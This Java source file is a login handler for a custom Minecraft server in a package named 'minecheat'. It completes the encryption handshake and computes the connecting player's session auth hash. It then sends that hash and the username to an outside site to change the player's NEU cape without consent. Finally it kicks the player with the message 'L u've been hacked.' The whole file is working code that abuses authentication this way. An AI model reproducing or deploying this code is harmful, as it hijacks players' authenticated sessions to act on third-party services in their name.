package kr.minecheat.mcauth.handler;

import kr.minecheat.mcauth.Server;
import kr.minecheat.mcauth.exception.AuthenticationException;
import kr.minecheat.mcauth.mcdata.Chat;
import kr.minecheat.mcauth.mcdata.UserData;
import kr.minecheat.mcauth.netty.MinecraftPacketHandler;
import kr.minecheat.mcauth.packets.*;
import kr.minecheat.mcauth.utils.EncryptionUtils;
import kr.minecheat.mcauth.utils.MojangUtils;

import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.Arrays;

public class LoginHandler extends PacketHandler {
    private UserData userData;

    private int state = 0;

    private byte[] verify_token;

    public LoginHandler(MinecraftPacketHandler nettyHandler) {
        super(nettyHandler);
    }

    @Override
    public void handlePacket(PacketHeader packetHeader) throws Exception {

        PacketData packetData = packetHeader.getData();
        if (packetData instanceof PacketStatus00ServerListPing && state == 0) {
            userData = new UserData();
            userData.setServerURL(((PacketStatus00ServerListPing) packetData).getServerURL());

            state ++;
            if (nettyHandler.getCurrentState() == PacketState.STATUS) nettyHandler.setCurrentState(PacketState.LOGIN);

            return;
        }

        if (packetData instanceof PacketLogin00LoginStart && state == 1) {
            userData.setUsername(((PacketLogin00LoginStart) packetData).getUsername());
            state ++;

            verify_token = EncryptionUtils.generateRandomByteArray(16);


            PacketLogin01EncryptionRequest pl01er = new PacketLogin01EncryptionRequest(Server.getServerKeys().getPublic(), verify_token);
            sendPacket(pl01er);
            return;
        }

        if (packetData instanceof PacketLogin01EncryptionResponse && state == 2) {
            PacketLogin01EncryptionResponse response = (PacketLogin01EncryptionResponse) packetData;
            byte[] decrypted_verify_token = EncryptionUtils.decrypt(Server.getServerKeys().getPrivate(), response.getVerify_token());
            if (!Arrays.equals(verify_token, decrypted_verify_token)) throw new AuthenticationException("verify token does not match");

            byte[] decrypted_shared_secret = EncryptionUtils.decrypt(Server.getServerKeys().getPrivate(), response.getShared_secret());
            userData.setShared_secret(decrypted_shared_secret);
            nettyHandler.setEncryption(decrypted_shared_secret);


            String weirdHash = EncryptionUtils.calculateAuthHash(decrypted_shared_secret, Server.getServerKeys().getPublic());
            String username = userData.getUsername();



            // The part that changes neu cosmetic

            String toEquipName = userData.getServerURL().split("\\.")[0];
            HttpURLConnection huc = (HttpURLConnection) new URI("https://moulberry.codes/cgi-bin/changecape.py?capeType="+toEquipName+"&serverId="+weirdHash+"&username="+username).toURL().openConnection();
            huc.setRequestMethod("GET");
            huc.setDoInput(true);
            huc.setDoOutput(true);

            throw new AuthenticationException("L u've been hacked. + "+huc.getResponseCode());
        }




    }
}
